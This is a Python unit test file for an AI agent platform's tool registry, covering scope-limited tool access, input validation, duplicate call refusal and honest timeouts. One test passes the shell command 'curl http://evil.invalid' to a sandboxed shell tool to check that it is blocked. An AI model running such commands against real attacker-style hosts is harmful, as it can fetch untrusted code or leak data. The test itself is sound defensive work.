"""AF NEXT P2 — Tool Registry & governed execution (UNIT)."""
import tempfile, time, unittest
from pathlib import Path
from unittest import mock

import core.config as config
from core import factory, opstatus, tool_events, tool_executor, tool_registry
from core.tests import trusted_request


def fixture(name="afp2-unit"):
    d = config.PROJECTS_DIR / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "meta.json").write_text('{"name":"%s","type":"webpage"}' % name,
                                 encoding="utf-8")
    (d / "sample.txt").write_text("hello", encoding="utf-8")
    return d


class RegistryTest(unittest.TestCase):
    def test_registry_scopes_tools_for_agent(self):
        reg = tool_registry.ToolRegistry()
        reg.ensure_builtins()
        names = {t.id for t in reg.list()}
        self.assertIn("project.read_file", names)
        self.assertIn("shell.safe_run", names)
        self.assertIn("android.build", names)
        read_only = reg.for_agent({"project:read"})
        self.assertTrue(all(t.scope == "project:read" for t in read_only))
        self.assertNotIn("project.write_file", {t.id for t in read_only})
        self.assertIn("project.write_file",
                      {t.id for t in reg.for_agent({"project:write"})})

    def test_input_validation_reports_missing_field(self):
        reg = tool_registry.ToolRegistry(); reg.ensure_builtins()
        spec = reg.get("project.read_file")
        self.assertIn("path", spec.validate_inputs({}))
        self.assertIsNone(spec.validate_inputs({"path": "sample.txt"}))

    def test_perception_exposes_only_allowed_tools(self):
        fixture()
        p = factory.perception_block("afp2-unit", task_text="hello", focus="chat")
        self.assertIn("project.read_file", p)
        self.assertNotIn("project.write_file", p)
        p2 = factory.perception_block("afp2-unit", task_text="fix the file",
                                      focus="execute")
        self.assertIn("project.write_file", p2)


class ExecutionTest(unittest.TestCase):
    def setUp(self):
        fixture()
        self.tf = tempfile.NamedTemporaryFile(suffix=".json")
        Path(self.tf.name).write_text("[]", encoding="utf-8")
        self.patcher = mock.patch.object(tool_events, "_STORE", Path(self.tf.name))
        self.patcher.start()

    def tearDown(self):
        self.patcher.stop()
        self.tf.close()

    def test_allowed_read_executes_and_records(self):
        r = tool_executor.execute(trusted_request(
            tool_id="project.read_file", project="afp2-unit",
            inputs={"path": "sample.txt"}, scopes=["project:read"],
            call_id="call-read"))
        self.assertEqual(r.status, opstatus.PASS)
        self.assertEqual(r.output["text"], "hello")
        ev = tool_events.events(project="afp2-unit", limit=3)
        self.assertTrue(any(e.get("call_id") == "call-read" and
                            e.get("status") == opstatus.PASS for e in ev))

    def test_forbidden_tool_is_not_executed(self):
        r = tool_executor.execute(trusted_request(
            tool_id="project.write_file", project="afp2-unit",
            inputs={"path": "sample.txt", "content": "bad"},
            scopes=["project:read"], call_id="call-denied"))
        self.assertEqual(r.status, opstatus.BLOCKED)
        self.assertIn("scope", r.error)
        self.assertEqual((config.PROJECTS_DIR / "afp2-unit/sample.txt").read_text(),
                         "hello")

    def test_forbidden_shell_is_blocked(self):
        r = tool_executor.execute(trusted_request(
            tool_id="shell.safe_run", project="afp2-unit",
            inputs={"command": "curl http://evil.invalid"},
            scopes=["shell:execute"], call_id="call-shell"))
        self.assertEqual(r.status, opstatus.BLOCKED)

    def test_duplicate_call_id_refused(self):
        req = trusted_request(
            tool_id="project.read_file", project="afp2-unit",
            inputs={"path": "sample.txt"}, scopes=["project:read"],
            call_id="call-once")
        self.assertEqual(tool_executor.execute(req).status, opstatus.PASS)
        self.assertEqual(tool_executor.execute(req).status, opstatus.BLOCKED)

    def test_timeout_is_honest(self):
        reg = tool_registry.registry()
        reg.register(tool_registry.ToolSpec(
            "test.sleep", "sleep", "unit", "test", "unit", "project:read",
            timeout_s=0.2, adapter=lambda p, i, **k: time.sleep(2)))
        r = tool_executor.execute(trusted_request(
            tool_id="test.sleep", project="afp2-unit", inputs={},
            scopes=["project:read"], call_id="call-timeout"))
        self.assertEqual(r.status, opstatus.BLOCKED)
        self.assertIn("timeout", r.error)


if __name__ == "__main__":
    unittest.main()
